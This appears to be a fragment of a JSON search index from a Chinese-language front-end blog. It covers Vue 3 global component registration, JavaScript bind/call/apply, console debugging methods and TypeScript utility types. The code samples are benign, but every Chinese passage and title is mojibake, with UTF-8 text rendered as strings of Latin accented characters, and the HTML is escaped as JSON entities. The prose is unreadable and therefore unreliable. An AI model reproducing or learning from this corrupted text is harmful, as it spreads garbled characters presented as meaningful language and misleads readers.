\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;date-tag\u0026gt;\u0026lt;/date-tag\u0026gt; \u0026lt;time-tag\u0026gt;\u0026lt;/time-tag\u0026gt; \u0026lt;host-tag\u0026gt;\u0026lt;/host-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var app = Vue.createApp({ //... }).use(myComponentsPlugin) .mount(\u0026#39;#app\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2022-11-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52489820266_b81b766288_o.png","permalink":"https://wayneblog.ga/2022-11-10/vue-2to3-global-component/","title":"Vue 2 å‡ç´š Vue 3 ä¹‹å…¨åŸŸå…ƒä»¶è¨»å†Šå•é¡Œ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nä½¿ç”¨ bindã€callã€apply æ”¹è®Š this æŒ‡å‘çš„å°è±¡ å¦‚æœæƒ³è¦æ”¹è®Š this æŒ‡å‘çš„å°è±¡ï¼Œå¯ä»¥é€é bindã€callã€apply é€™ä¸‰å€‹ method è¾¦åˆ°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 const person = { userName: \u0026#39;Blueberry\u0026#39; } // æ¥è‘— create ä¸€å€‹å‡½å¼ä¾†å‘¼å« person çš„ userNameï¼š function callName() { console.log(\u0026#39;Hello \u0026#39; + this.userName); } // å‘¼å« callNameï¼š callName(); outputï¼š 1 \u0026gt; Hello undefined å› ç‚º callName() å‡½å¼ä¸­çš„ this æŒ‡å‘çš„æ˜¯ global objectï¼ˆä¹Ÿå°±æ˜¯ Window ç‰©ä»¶ï¼‰ï¼Œæ‰€ä»¥é€™æ™‚å€™æˆ‘å€‘å¸Œæœ›æŠŠ callName() çš„ this æŒ‡å‘ person é€™å€‹å°è±¡ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š\nbind MDN web docs\n1 function.bind(thisArg[, arg1[, arg2[, ...]]]) bind å’Œå…¶ä»–å…©å€‹æ–¹æ³•ï¼ˆcallã€applyï¼‰çš„ä¸åŒæœ‰å…©é»ï¼š\nbind æ˜¯å‰µé€ ä¸€å€‹å‡½å¼ç‰©ä»¶çš„æ‹·è²ï¼Œä¸æœƒåŸ·è¡Œå‡½å¼ï¼Œå› æ­¤ bind ä¹‹å¾Œé‚„è¦å†å¦å¤–å¯«åŸ·è¡Œå‡½å¼çš„å‹•ä½œï¼›è€Œ callã€apply æ˜¯ç›´æ¥åŸ·è¡Œå‡½å¼ã€‚ bind å¾Œé¢å‚³å…¥çš„åƒæ•¸å€¼æœƒè¨­å®šç‚ºæ‹·è²å‡½å¼çš„æ°¸ä¹…åƒæ•¸å€¼ï¼Œä¹‹å¾ŒåŸ·è¡Œæ‹·è²å‡½å¼æ™‚ï¼Œç„¡è«–æ€éº¼çµ¦äºˆåƒæ•¸éƒ½æ²’æœ‰ç”¨ï¼›è€Œ callã€apply å‰‡æ˜¯å–®ç´”çµ¦äºˆåƒæ•¸ï¼Œåƒä¸€èˆ¬å‘¼å«å‡½å¼é‚£æ¨£ã€‚ æˆ‘å€‘å…ˆå–®ç´”å°±ç¬¬ä¸€é»ä¾†èªªæ˜ï¼Œç¤ºç¯„æœ€åŸºæœ¬çš„ bind æ€éº¼å¯«ã€‚\nç¬¬ä¸€ç¨®å¯«æ³• 1 callName.bind(person)(); ä¹Ÿç­‰æ–¼ï¼š\n1 2 const callFunction = callName.bind(person); // å‰µé€ å‡½å¼ç‰©ä»¶çš„æ‹·è² callFunction(); // åŸ·è¡Œå‡½å¼ outputï¼š 1 \u0026gt; Hello Blueberry ç¬¬äºŒç¨®å¯«æ³•ï¼Œç›´æ¥å¯«åœ¨å‡½å¼è¡¨ç¤ºå¼å¾Œé¢ä¹Ÿå¯ä»¥ 1 2 3 4 5 const callName = function() { console.log(\u0026#39;Hello \u0026#39; + this.userName); }.bind(person); callName(); outputï¼š 1 \u0026gt; Hello Blueberry æ¥ä¸‹ä¾†é‡å°ç¬¬äºŒé»ä¾†èªªæ˜ï¼Œå…ˆä¾†æ”¹å¯«ä¸€ä¸‹ callName å‡½å¼ï¼ŒåŠ å…¥å…©å€‹ argumentsï¼š\n1 2 3 4 5 function callName(age, interest) { console.log(\u0026#39;Hello \u0026#39; + this.userName); console.log(\u0026#39;Your age is \u0026#39; + age); console.log(\u0026#39;Your interest is \u0026#39; + interest); } æ¥è‘—æˆ‘å€‘é™¤äº†è¦ç”¨ bind å°‡ this æŒ‡å‘ person ä¹‹å¤–ï¼Œé‚„è¦çµ¦äºˆ age å’Œ interest é€™å…©å€‹åƒæ•¸ã€‚\né€™é‚Šæœ‰å…©ç¨®åšæ³•ï¼šå–®ç´”çµ¦å®šåƒæ•¸ï¼Œæˆ–ç¶å®šæ°¸ä¹…åƒæ•¸å€¼ã€‚\nå–®ç´”çµ¦å®šåƒæ•¸ è¦å–®ç´”çµ¦å®šåƒæ•¸çš„è©±ï¼Œåƒä¸€èˆ¬åŸ·è¡Œå‡½å¼é‚£æ¨£ï¼Œåœ¨åŸ·è¡Œå‡½å¼æ™‚å†çµ¦äºˆåƒæ•¸å°±å¯ä»¥äº†ã€‚\n1 2 const callFunction = callName.bind(person); callFunction(24, \u0026#39;Reading books\u0026#39;); outputï¼š 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books ç¶å®šæ°¸ä¹…åƒæ•¸å€¼ å¦‚æœå°‡åƒæ•¸æ”¾åœ¨ bind ä¸­ï¼Œé€™å€‹å‡½å¼æ‹·è²ç‰©ä»¶çš„åƒæ•¸å€¼å°±æœƒæ°¸é è¢«å›ºå®šä½ã€‚\n1 2 const callFunction = callName.bind(person, 24, \u0026#39;Reading books\u0026#39;); callFunction(30, \u0026#39;Playing games\u0026#39;); // é€™é‚Šç„¡è«–å†æ€éº¼çµ¦åƒæ•¸éƒ½æ²’ç”¨ outputï¼š 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books call MDN web docs\n1 function.call(this, arg1, arg2..., argn) call å’Œ bind ä¸åŒï¼Œå®ƒæœƒç›´æ¥åŸ·è¡Œå‡½å¼ï¼Œå¾Œé¢çµ¦çš„åƒæ•¸ä¹Ÿä¸æœƒè¢«å›ºå®šä½ã€‚\n.call() å­˜åœ¨æ–¼ä»»ä½•ä¸€å€‹å‡½æ•¸æˆ–è€…æ–¹æ³•ä¸Šï¼Œæ˜¯å€‹ function å°±å¯ä»¥èª¿ç”¨ .call()ã€‚\n1 callName.call(person, 24, \u0026#39;Reading books\u0026#39;); outputï¼š 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books ä¿®æ”¹ this æŒ‡å‘ å°æ–¼æ²’æœ‰å®šç¾©åœ¨ä»»ä½•å°åƒä¸Šçš„ functionï¼Œå¯¦éš›ä¸Šä¹Ÿæœ‰ this æŒ‡å‘ï¼ŒæŒ‡å‘çš„æ˜¯å€‹å…¨å±€å°è±¡ã€‚ å°æ–¼å®šç¾©åœ¨æŸå€‹ object ä¸Šé¢çš„æ–¹æ³•ï¼Œthis æŒ‡å‘ï¼Œå¾ˆå¥½ç†è§£ã€‚ ä¸‹é¢æ‹¿ä¸€å€‹å°è±¡è®Šæ•¸åšä¾‹å­ï¼Œä¾†èªªæ˜å•é¡Œï¼š\n1 2 3 4 5 6 7 8 let sunan = { c: 3, test: function (a, b) { return a + b + this.c; } } console.log(sunan.test(1, 2)); // 6 console.log(sunan.test.call({ c: 4 }, 1, 2)); // 7 åœ¨é€™å€‹ä¾‹å­è£¡é¢ï¼Œ.call() çš„ç¬¬ä¸€å€‹åƒæ•¸å‚³å…¥äº†ä¸€å€‹æ–°çš„å°è±¡ï¼Œå®ƒè¦†è“‹äº†åŸæœ‰çš„æ•¸æ“šã€‚c å±¬æ€§ç”± 3 è®Šæˆäº† 4ï¼Œè€Œ test æ–¹æ³•ä¾ç„¶å­˜åœ¨ã€‚\noutputï¼š 1 2 \u0026gt; 6 \u0026gt; 7 apply MDN web docs\n1 function.apply(this, [arg1, arg2..., argn]) apply çš„å¯«æ³•è·Ÿ call å¾ˆç›¸è¿‘ï¼Œèˆ‡ call ä¸åŒçš„æ˜¯ï¼Œå¾Œé¢çš„åƒæ•¸éœ€è¦ä½¿ç”¨é™£åˆ—å‚³éï¼Œé©åˆæ­é… arguments é‹ç”¨åœ¨ç®—æ•¸çš„å‡½å¼ã€‚\n1 callName.apply(person, [24, \u0026#39;Reading books\u0026#39;]); outputï¼š 1 2 3 \u0026gt; Hello Blueberry \u0026gt; Your age is 24 \u0026gt; Your interest is Reading books åŒä¸€å€‹ä¾‹å­çš„ call èˆ‡ apply å¯«æ³•æ¯”è¼ƒ 1 2 callName.call(person, 24, \u0026#39;Reading books\u0026#39;); callName.apply(person, [24, \u0026#39;Reading books\u0026#39;]); ä¿®æ”¹ this æŒ‡å‘ å’Œ .call() ä¸€æ¨£ï¼Œ.apply() çš„ç¬¬ä¸€å€‹åƒæ•¸ä¹Ÿæ˜¯ä¿®æ”¹ this æŒ‡å‘çš„ã€‚ å¯èƒ½çš„éŒ¯èª¤ ä¹Ÿè¨±æœƒç¢°åˆ°ä¸‹é¢çš„éŒ¯èª¤æç¤ºä¿¡æ¯ï¼š\n1 TypeError: CreateListFromArrayLike called on non-object è§£æ±ºæ–¹æ¡ˆå°±æ˜¯æŠŠåƒæ•¸æ‰“åŒ…æˆæ•¸çµ„[]ï¼Œé€²è¡Œå‚³éã€‚\nä½¿ç”¨æƒ…å¢ƒ function borrowingï¼š å€Ÿç”¨ function function borrowing å°±æ˜¯å€Ÿåˆ¥äººå‡½å¼ä¸­çš„æ–¹æ³•ä¾†ç”¨çš„æ„æ€ï¼Œä¸‹é¢ç¤ºç¯„ somebody å€Ÿç”¨ person çš„ getUserName æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const person = { userName: \u0026#39;Blueberry\u0026#39;, getUserName: function() { console.log(this.userName); } } const somebody = { userName: \u0026#39;Fan\u0026#39; } // with bind() const newUser = person.getUserName.bind(somebody); newUser(); // with call() person.getUserName.call(somebody); // with apply() person.getUserName.apply(somebody); outputï¼š 1 2 3 \u0026gt; Fan \u0026gt; Fan \u0026gt; Fan function curryingï¼š æ‹·è² function function currying çš„å®šç¾©ç‚ºå»ºç«‹ä¸€å€‹å‡½å¼çš„æ‹·è²ï¼Œä¸¦è¨­å®šé è¨­çš„åƒæ•¸ï¼Œé€™åœ¨æ•¸å­¸é‹ç®—ä¸‹å¾ˆæœ‰ç”¨ã€‚ä¸‹é¢æˆ‘å€‘å°±åˆ©ç”¨ bind çš„ç‰¹æ€§ä¾†å®Œæˆ function curryingã€‚\n1 2 3 4 5 6 const mutiply = function (a, b) { return a * b; } const mutiplyByTwo = mutiply.bind(this, 2); console.log(mutiplyByTwo(4)); outputï¼š 1 \u0026gt; 8 ä¸Šé¢æˆ‘å€‘å»ºç«‹äº†ä¸€å€‹å‡½å¼ mutiply(a, b)ï¼Œä¸¦ç”¨ bind å»ºç«‹å‡½å¼ç‰©ä»¶æ‹·è² mutiplyByTwo()ã€‚\nmutiply.bind(this, 2) é€™é‚Šçš„ this ä¸¦ä¸é‡è¦ï¼Œå› ç‚ºå‡½å¼è£¡æ²’æœ‰ä½¿ç”¨åˆ° thisã€‚\nè€Œå¾Œé¢çš„ 2 å‰‡æ˜¯æ°¸ä¹…ç¶å®šäº†åƒæ•¸ aã€‚\nç‚ºäº†è®“ç¨‹å¼ç¢¼æ¯”è¼ƒå¥½ç†è§£ï¼Œé€™é‚Šå°‡ä¸Šé¢é‚£æ®µç¨‹å¼ç¢¼æ‹†è§£ï¼Œå®ƒä¹Ÿç­‰æ–¼ï¼š\n1 2 3 4 5 6 7 8 const mutiply = function (a) { return (b) =\u0026gt; { return a * b; } } const mutiplyByTwo = mutiply(2); console.log(mutiplyByTwo(4)); outputï¼š 1 \u0026gt; 8 ","date":"2022-11-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52487952181_5991519a08_o.jpg","permalink":"https://wayneblog.ga/2022-11-09/js-call-apply-bind/","title":"ä½¿ç”¨ bindã€callã€apply æ”¹è®Š this æŒ‡å‘çš„å°è±¡"},{"content":" åƒè€ƒç¶²ç«™\nå¯« JavaScript éœ€è¦æª¢è¦–é‹ä½œæ˜¯å¦æ­£ç¢ºæ™‚å€™ï¼Œéƒ½æœƒä½¿ç”¨ console.log ä¾†æª¢è¦–è¼¸å‡ºæˆ–é‹ç®—çš„å€¼ï¼Œè€Œ console çš„é‹ç”¨æŠ€å·§ä¸åƒ…åƒ…åªæœ‰å°‡å€¼å‘ˆç¾åœ¨é–‹ç™¼çš„ Console ä»‹é¢ä¸­ã€‚æœ¬ç¯‡å°±ä¾†ä»‹ç´¹è¨±å¤š console èªæ³•çš„å¯¦æˆ°é‹ç”¨æ–¹æ³•å§ï¼\né¦–å…ˆï¼Œåœ¨æ­¤å…ˆæº–å‚™ä¸€ä»½ç­‰ç­‰æœƒç”¨åˆ°çš„ç‰©ä»¶åŠé™£åˆ—ä½œç‚ºä»¥ä¸‹ç¯„ä¾‹ä½¿ç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 const Ming = { name: \u0026#39;å°æ˜\u0026#39;, age: 15, favorite: \u0026#39;é‹ç‡’æ„éºµ\u0026#39; } const Jay = { name: \u0026#39;æ°å€«\u0026#39;, age: 16, favorite: \u0026#39;ç‚’éºµ\u0026#39; } const Auntie = { name: \u0026#39;æ¼‚äº®é˜¿å§¨\u0026#39;, age: 21, favorite: \u0026#39;è˜¿è””ç³•\u0026#39; } const people = [Ming, Jay, Auntie]; ç‚º console.log çš„ç¨‹å¼ç¢¼ä¸Šè‰² æœ‰åœ¨ Facebook é é¢ä¸­é–‹å•Ÿéé–‹ç™¼è€…å·¥å…·å—ï¼Ÿå¦‚æœæœ‰ï¼Œç›¸ä¿¡ä½ å°æ–¼ä»¥ä¸‹é€™å¼µåœ–ä¸¦ä¸é™Œç”Ÿã€‚\nConsole ä¸­çš„æ–‡å­—ä¸¦éåªæœ‰å›ºå®šçš„è‰²å½©ï¼Œå®ƒèˆ‡ç¶²é ä¸­çš„æ–‡å­—ä¸€æ¨£ï¼Œéƒ½å¯ä»¥é€é CSS çš„èªæ³•ä¾†èª¿æ•´å…¶è‰²å½©ï¼Œåªè¦åœ¨ log çš„æ–‡å­—å‰æ–¹å…ˆåŠ å…¥ %c å¾Œï¼Œåœ¨ , å¾Œæ–¹çš„åƒæ•¸å°±èƒ½å¤ å‚³å…¥ CSS èªæ³•åšç‚ºåƒæ•¸ï¼Œä¸¦ä¸”èª¿æ•´ Console ä¸­å‘ˆç¾çš„æ–‡å­—æ¨£å¼ã€‚\n1 console.log(`%c ${Ming.name} æœ‰ç‘Ÿç‘Ÿçš„é¡è‰²`, \u0026#39;color: orange; font-size: 24px\u0026#39;); console.table()ï¼šä½¿ç”¨è¡¨æ ¼çš„æ–¹å¼é™³åˆ—é™£åˆ—çš„è³‡è¨Š ç•¶è¦å‘ˆç¾è³‡æ–™æ–¼ Console ä»‹é¢ä¸­ï¼Œåšå¸¸è¦‹çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ log çš„æ–¹æ³•ï¼š\n1 2 3 4 5 6 // åŸºæœ¬ç”¨æ³• console.log(Ming); console.log(Jay); console.log(Auntie); console.log(people); ç•¶ç„¶ï¼Œé€™æ¨£çš„ç”¨æ³•çµ•å°æ²’æœ‰å•é¡Œï¼Œé€éæ­¤æ–¹æ³•å¯ä»¥å°‡å€¼ä¸€ä¸€é™³åˆ—å‡ºä¾†ï¼Œä¸éç•¶é€™äº›æ•¸å€¼æ˜¯ å…·æœ‰é—œè¯æ€§ æ™‚ï¼Œä¸€èˆ¬çš„ log å°±ç„¡æ³•æ¯”è¼ƒå…©è€…ä¹‹é–“çš„é—œä¿‚ã€‚\nconsole.table() é‡å°ç‰©ä»¶ä¹‹é–“æœ‰ç›¸åŒçš„å±¬æ€§åç¨±æ™‚ï¼Œå°±èƒ½å¤ è¼•æ˜“çš„æ¯”è¼ƒç›¸åŒå±¬æ€§ä¹‹é–“çš„é—œä¿‚ã€‚\n1 2 console.table([Ming, Jay, Auntie]); console.table(people); é™¤æ­¤ä¹‹å¤–ï¼Œè¡¨æ ¼ä¸Šæ–¹çš„æ¨™é ­é‚„å¯ä»¥é»é¸ä½œç‚ºæ’åºä½¿ç”¨ï¼Œå¦‚æœæ‹¿åˆ°ä¸€å€‹ JSON æƒ³æ¯”å°å…¶ä¸­çš„å€¼ï¼Œé‚„è¦è½‰è²¼åˆ° Excel æˆ–æ˜¯ sort() èªæ³•å®‰æ’ï¼Œä¸å¦‚ç›´æ¥æ”¹ç”¨ table() é€²è¡Œæ¯”è¼ƒå§ã€‚\nconsole.group()ï¼šç¾¤çµ„åŒ–å¤§é‡çš„ log è³‡è¨Š ä½¿ç”¨ log() è§€çœ‹è¿´åœˆå€¼æ˜¯åˆæƒ…åˆç†çš„ï¼Œä¸éç•¶é™£åˆ—çš„é•·åº¦æœ‰ä¸Šç™¾ç­†æ™‚ï¼ŒConsole ä»‹é¢ä¸­çš„è³‡æ–™é‚„çœŸæœƒæ»¾åˆ°ä»¤äººå­ä¸–ã€‚\n1 2 3 4 for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } åœ¨è¿´åœˆä¸­ä½¿ç”¨ console.log() æœƒä¸€ä¸€å‘ˆç¾è³‡æ–™ï¼Œæ•¸é‡ä¸€å¤šçœ‹èµ·ä¾†å°±æœƒé¡¯çš„å¾ˆåƒåŠ›\nä½¿ç”¨ console.group()ã€console.groupEnd() è¨­ç½®ç¾¤çµ„çš„èµ·è¨–ï¼Œåœ¨ Console çš„ä»‹é¢ä¸­å°±èƒ½æ–¹ä¾¿çš„æ”¶åˆç¾¤çµ„å…§å®¹ã€‚\n1 2 3 4 5 6 console.group(\u0026#39;è¿´åœˆç¾¤çµ„\u0026#39;); for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } console.groupEnd(); console.group(/* ç¾¤çµ„åç¨± */) å¯ä»¥å‚³å…¥ ç¾¤çµ„åç¨± åšç‚ºåƒæ•¸ï¼Œä½œç‚ºåœ¨ Console ä»‹é¢ä¸­è¾¨è­˜ç¾¤çµ„çš„é¡¯ç¤ºåç¨±ï¼Œåœ¨ä»‹é¢ä¸­çš„ç¾¤çµ„åç¨±ä¹Ÿæœƒä»¥ç²—é«”åç¨±ï¼Œä¸¦ä¸”å¯ä»¥é»æ“Šç®­é ­ç¬¦è™Ÿæ”¶åˆç¾¤çµ„å…§å®¹ã€‚\nconsole.time()ï¼šé–‹ç™¼è€…æœ€æ„›æ–¤æ–¤è¨ˆè¼ƒé‚£ 1ms çš„æ•ˆèƒ½äº† æ¯ç•¶å¯«å‡ºç¥é‚è¼¯çš„æ™‚å€™ï¼Œéƒ½æœƒæ“”å¿ƒé›»è…¦æ•ˆèƒ½è·Ÿä¸ä¸Šè‡ªå·±çš„æ€ç¶­ï¼Œé€™æ™‚å€™å°±å¯ä»¥ä½¿ç”¨ time() è¿½è¹¤ç‰‡æ®µç¨‹å¼ç¢¼æ‰€è™•ç†çš„æ™‚é–“å·®ï¼Œå¾—çŸ¥è‡ªå·±æ˜¯ä¸æ˜¯è©²æ›å°é›»è…¦è§£æ±ºå•é¡Œã€‚\n1 2 3 4 5 6 7 // æ™‚é–“è¿½è¹¤ console.time(\u0026#39;è¿´åœˆè™•ç†æ™‚é–“\u0026#39;); for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } console.timeEnd(\u0026#39;è¿´åœˆè™•ç†æ™‚é–“\u0026#39;); åœ¨èµ·è¨–ä¸­åˆ†åˆ¥åŠ å…¥ time() ä»¥åŠ timeEnd()ï¼ŒåŸ·è¡Œç¨‹å¼ç¢¼å¾Œå°±å¯ä»¥ç²å¾—è™•ç†çš„çµæœã€‚\nconsole.dir()ï¼šä»¥ç‰©ä»¶çš„å½¢å¼å‘ˆç¾è³‡æ–™ 1 2 3 // HTML \u0026lt;p\u0026gt;æ¨è–¦çš„ Console èªæ³•\u0026lt;/p\u0026gt; const p = document.querySelector(\u0026#39;p\u0026#39;); console.log(p); ç•¶ä½¿ç”¨ console.log() æŸ¥çœ‹ DOM å…ƒç´ ï¼Œä¸¦æƒ³äº†è§£å…¶ä¸­å¯ç”¨çš„æ–¹æ³•æˆ–å±¬æ€§æ™‚â€¦ï¼Œå®ƒå¯èƒ½æœƒå‡ºç¾å¦‚ä¸‹å¸¶é»å¤±æœ›çš„æ¨™ç±¤ï¼Œä¸¦ä¸”å¿ƒè£¡é»˜ç½µï¼š\nè¦é€™å€‹å¹¹å˜›å•¦ è¦çŸ¥é“çš„æ˜¯ç‰©ä»¶å±¬æ€§ã€å±¬æ€§ é€™æ™‚å€™éœ€è¦çš„æ˜¯ console.dir()ï¼Œä½ æœƒç™¼ç¾å¦ä¸€å€‹æ–°ä¸–ç•Œï¼ŒåŸæœ¬çš„ DOM å…ƒç´ è¢«æ”¹ç‚ºç‰©ä»¶çš„å½¢å¼å‘ˆç¾ï¼Œä½ å¯ä»¥è¼•é¬†å±•é–‹æ­¤ç‰©ä»¶ï¼Œä¸¦æª¢è¦–è£¡é¢æœ‰å“ªäº›å¯ç”¨å±¬æ€§ã€‚\n1 2 const p = document.querySelector(\u0026#39;p\u0026#39;); console.dir(p); å±•é–‹çš„ P å…ƒç´ ï¼ŒåŒ…å«å…¶ä¸­æ‰€æœ‰çš„å±¬æ€§ï¼ˆé€™åœ¨æ“ä½œ DOM æ™‚æ¥µç‚ºå¥½ç”¨ï¼‰\nconsole.error() å¯«ç¨‹å¼æœ‰éŒ¯èª¤æ˜¯é›£å…çš„ï¼Œä½†æ˜¯å¦‚æœæ˜¯éŒ¯èª¤ï¼Œå»æ²’æœ‰æ˜ç¢ºçš„æç¤ºå°è‡´æ²’æœ‰è¢«ç™¼ç¾å•é¡Œï¼Œå°±å¤±å»æç¤ºçš„æ„ç¾©äº†ï¼Œå¦‚æœæƒ³è®“ Console çš„å…§å®¹æ›´åŠ é†’ç›®ï¼Œå¯ä»¥ä½¿ç”¨ console.error() ä½¿è¨Šæ¯åœ¨ Console ä»‹é¢ä¸­ä»¥éŒ¯èª¤çš„å½¢å¼å‘ˆç¾ã€‚\n1 console.error(`${Ming.name} ä½ å®Œè›‹äº†`); ç•¶é‹ç”¨åœ¨ä¸€èˆ¬æ–‡å­—è¨Šæ¯ä¸Šæ™‚ï¼Œä¹Ÿå¯ä»¥å±•é–‹è¨Šæ¯ä¸¦èªªæ˜éŒ¯èª¤ä¾†æºè‡ªå“ªä¸€æ®µç¨‹å¼ç¢¼ã€‚\nåœ¨ AJAX çš„æœªç¢ºèªç‹€æ…‹ä¸­ï¼Œä¹Ÿæœƒä½¿ç”¨ console.error ä¾†å‘ˆç¾éŒ¯èª¤çš„å›é¥‹è¨Šæ¯ï¼Œä»¥ä¸‹ç¯„ä¾‹åˆ»æ„å°‡ API è·¯å¾‘èª¿æ•´æˆéŒ¯èª¤çš„ï¼Œä¸¦é€é console.error() ä¾†å°‡éŒ¯èª¤çš„è³‡è¨Šå‘ˆç¾åœ¨ Console ä»‹é¢ä¸­\n1 2 3 4 5 6 // Error axios.get(\u0026#39;https://randomuser.me/apis\u0026#39;) .then((res) =\u0026gt; console.log(res)) .catch((error) =\u0026gt; { console.error(\u0026#39;å¾…èªŒå¤§æ¢å•¦: \u0026#39;, error.response) }) console.warn() éŒ¯èª¤å¤ªçªå…€äº†å—ï¼Ÿå¦‚æœæ˜¯è‡ªè¡Œé–‹ç™¼çš„å‡½å¼åº«ï¼Œå·²ç¶“é€éå„ç¨®å½¢å¼é¿å…ç¨‹å¼ç¢¼å‡ºéŒ¯ï¼Œä½†é‚„æ˜¯æƒ³æŠŠæœ‰éŒ¯èª¤çš„è¨Šæ¯çµ¦äºˆé–‹ç™¼è€…çŸ¥é“ï¼Œé‚£éº¼å‰‡å¯ä»¥ä½¿ç”¨ console.warn()ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 // Warning /*** * è¶…ç²¾ç¾å‡½å¼åº« ğŸ’– * @param {number} num ç´”æ•¸å€¼ * @param {string} text è«‹å‚³å…¥å­—ä¸² */ function superMagicLibrary(num, text) { if (typeof num !== \u0026#39;number\u0026#39;) { console.warn(\u0026#39;å°Šé‡ä¸€ä¸‹å¥½å—ï¼Œè«‹å‚³å…¥ç´”æ•¸å€¼\u0026#39;) } } superMagicLibrary(\u0026#39;å­—ä¸²\u0026#39;); å‡½å¼åº«ä¸­å¤§å¤šæœƒé¿å…å·²çŸ¥çš„éŒ¯èª¤ï¼Œå¦‚æœè¦å‹å–„çš„çµ¦äºˆå›é¥‹ï¼Œå¯ä»¥ä½¿ç”¨ warn() ä»£æ›¿ error() æé†’é–‹ç™¼è€…æ›´å¥½çš„åšæ³•ã€‚\nconsole.clear() å¦‚æœè¦ºå¾— Console ä»‹é¢å·²ç¶“å……æ»¿äº†è¨±å¤šä¸å¿…è¦çš„è³‡è¨Šï¼Œæƒ³è¦å°ˆæ³¨æ–¼ç•¶å‰é–‹ç™¼çš„ç¨‹å¼ç¢¼ï¼Œé‚£éº¼å¯ä»¥åŠ å…¥ console.clear()ã€‚\nç•«é¢ä¸­æœƒå‡ºç¾ Console was cleared çš„å­—çœ¼\næ­¤èªæ³•äº¦å¯åœ¨ Console ä»‹é¢ä¸­ç›´æ¥è¼¸å…¥ï¼Œæœƒç›´æ¥æ¸…é™¤ç•¶ä¸‹çš„æ‰€æœ‰è³‡è¨Šå…§å®¹ã€‚\nä¸éè«‹æ…ç”¨æ­¤æ–¹æ³•ï¼Œå¦‚æœéš¨æ„æ’å…¥ console.clear() åœ¨ä¸åŒçš„æª”æ¡ˆä¸­ï¼Œä¸çŸ¥æƒ…çš„å¤¥ä¼´ä¸€å®šæœƒåœ¨é–‹ç™¼ä¸­å¡å¾ˆä¹…ï¼Œå¯èƒ½ç™¼ç”Ÿçš„æƒ…å¢ƒæœ‰â€¦ï¼š\nå¥‡æ€ªï¼Œæˆ‘å¯«çš„ Code æ€éº¼éƒ½æ²’é¡¯ç¤ºåœ¨ Console ç·¨è­¯å™¨å£äº†å—ï¼Ÿæ€éº¼å¥½åƒæ²’æœ‰é‹ä½œ æˆ‘çš„ Chrome æ€ªæ€ªçš„ é‚„æœ‰å“ªäº›æ–¹æ³•ä½ ä¹Ÿå¸¸ç”¨ï¼Œä½†æ²’æœ‰ä»‹ç´¹åˆ°çš„å‘¢ï¼Ÿæ­¡è¿åœ¨åº•ä¸‹ç•™è¨€å€ç•™è¨€å–”\n","date":"2022-11-03T00:00:00Z","image":"https://live.staticflickr.com/65535/52473860621_0ede00e99a_o.jpg","permalink":"https://wayneblog.ga/2022-11-03/js-8-console-tricks/","title":"8 æ‹› JavaScript Console é‹ç”¨æŠ€å·§ï¼Œè®“ä½ é™¤éŒ¯æ›´é«˜æ•ˆ"},{"content":" åƒè€ƒç¶²ç«™\nå¾ˆå¤šäººåœ¨å¹³æ™‚çš„é–‹ç™¼ä¸­ä½¿ç”¨åˆ°äº† TypeScriptï¼Œä½†æ˜¯å¯èƒ½åªæ˜¯å–®ç´”ä½¿ç”¨äº†ä¸€äº›åŸºæœ¬çš„é¡å‹ï¼Œä½†å¾ˆå¤šäººä¸çŸ¥é“å…¶å¯¦ TypeScript è‡ªå¸¶äº†å¾ˆå¤šéå¸¸æ–¹ä¾¿çš„æ–¹æ³•ï¼Œæ¥ä¸‹ä¾†æˆ‘å°±çµåˆä¾‹å­ï¼Œçµ¦å¤§å®¶ä»‹ç´¹ä¸€ä¸‹é€™äº›å¾ˆæ–¹ä¾¿çš„æ–¹æ³•ã€‚\nTypeScript è‡ªå¸¶çš„æ–¹æ³• Partial ä½œç”¨ Partial å°‡é¡å‹çš„å±¬æ€§è®Šæˆå¯é¸\nä¾‹å­ å‡å¦‚æˆ‘ç¾åœ¨æœ‰å€‹ interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } æœ‰ä¸€å¤©ï¼Œæˆ‘æƒ³æŠŠ IUser èº«ä¸Šçš„å±¬æ€§éƒ½è®Šæˆå¯é¸çš„ï¼Œé‚£æˆ‘å¯èƒ½æœƒå†å¯«ä¸€å€‹ interface\n1 2 3 4 5 interface IUser2 { name?: string; age?: number; gender?: number; } ä½†æ˜¯å¦‚æœå±¬æ€§å¤šäº†çš„è©±ï¼Œæˆ‘å€‘åˆå¾—å¯«å¾ˆå¤šé¡å¤–çš„ä»£ç¢¼ï¼Œé€™å€‹æ™‚å€™å°±å¯ä»¥ç›´æ¥ç”¨ Partial\n1 2 3 4 5 6 7 8 9 type IUser2 = Partial\u0026lt;IUser1\u0026gt; // ç­‰åŒæ–¼ interface IUser2 { name?: string; age?: number; gender?: number; } åŸç† 1 2 3 type Partial\u0026lt;T\u0026gt; = { [P in keyof T]?: T[P]; }; Required ä½œç”¨ Required å°‡é¡å‹çš„å±¬æ€§è®Šæˆå¿…é¸\nä¾‹å­ å‡å¦‚æˆ‘ç¾åœ¨æœ‰å€‹ interface\n1 2 3 4 5 interface IUser1 { name: string; age?: number; gender?: number; } 